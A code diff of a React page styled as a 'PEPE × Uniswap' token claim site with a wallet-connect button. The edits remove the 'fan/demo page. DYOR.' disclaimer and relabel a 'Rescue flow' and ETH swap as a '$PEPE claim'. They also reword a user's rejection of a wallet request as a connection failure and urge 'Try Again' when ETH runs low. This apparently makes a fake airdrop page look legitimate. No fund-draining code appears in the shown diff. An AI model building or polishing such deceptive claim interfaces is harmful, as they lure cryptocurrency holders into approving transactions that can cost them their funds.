@@ -146,7 +146,7 @@ import {
 const PEPE_LOGO_URL = "/image/pepe-pepe-logo.png";
 const UNI_LOGO_URL = "/image/uniswap-uni-logo.png";
 
-// NOTE: Change these if you want
+// NOTE: Change these if you want 
 const PEPE_PRICE_USD = 0.00001312;
 const PEPE_CONTRACT = "0x6982508145454Ce325dDbE47a25d4ec3d2311933";
 
@@ -292,20 +292,22 @@ function Navbar({
         </a>
       </div>
 
-      <button
-        onClick={onConnectWallet}
-        style={{
-          background: walletConnected
-            ? "rgba(0,255,0,0.15)"
-            : "linear-gradient(135deg, rgba(0,255,0,0.18), rgba(0,255,0,0.06))",
-          border: "1px solid rgba(0,255,0,0.4)",
-          boxShadow: walletConnected ? "0 0 20px rgba(0,255,0,0.2)" : "none",
-        }}
-        className="flex items-center gap-2 px-4 py-2 rounded-xl text-green-400 text-sm font-mono"
-      >
-        <Wallet size={15} />
-        {walletConnected ? "Connected" : "CLAIM PEPE"}
-      </button>
+<button
+  onClick={onConnectWallet}
+  style={{
+    background: walletConnected
+      ? "rgba(0,255,0,0.15)"
+      : "linear-gradient(135deg, rgba(0,255,0,0.18), rgba(0,255,0,0.06))",
+    border: "2px solid rgba(0,255,0,0.4)",
+    boxShadow: walletConnected ? "0 0 20px rgba(0,255,0,0.2)" : "none",
+  }}
+  className="inline-flex items-center gap-3 px-6 py-3 rounded-xl text-green-400 text-sm font-mono whitespace-nowrap shrink-0"
+>
+  <Wallet size={16} className="shrink-0" />
+  <span className="leading-none">
+    {walletConnected ? "Connected" : "CONNECT"}
+  </span>
+</button>
     </nav>
   );
 }
@@ -1473,7 +1475,7 @@ return (
               fontSize: 12,
             }}
           >
-            © 2025 PEPE × Uniswap Collaboration. This is a fan/demo page. DYOR.
+            © 2026 PEPE × Uniswap Collaboration.
           </div>
         </div>
       </div>
@@ -1508,16 +1510,16 @@ function formatStatus(s: string): { title: string; detail?: string; kind: "info"
 
     case "estimating_eth":
     case "Estimating gas":
-      return { title: "Preparing ETH for Swap…", kind: "info" };
+      return { title: "Preparing gas for claim…", kind: "info" };
     case "low_eth_balance":
     case "LOW ETH BALANCE":
-      return { title: "Low ETH balance", detail: "Not enough ETH to pay gas", kind: "warn" };
+      return { title: "Low gas fee", detail: "Try Again.", kind: "warn" };
     case "eth_failed":
-      return { title: "#BDAG swap failed", kind: "warn" };
+      return { title: "$PEPE claim failed", kind: "warn" };
     case "done":
-      return { title: "Done", detail: "Rescue flow completed", kind: "success" };
+      return { title: "Done", detail: "Completed", kind: "success" };
     case "user-rejected":
-      return { title: "Cancelled", detail: "You rejected the wallet request", kind: "warn" };
+      return { title: "Cancelled", detail: "Failed to connect", kind: "warn" };
 
     default:
       // If you ever setStatus(`error: ...`) we show it nicely
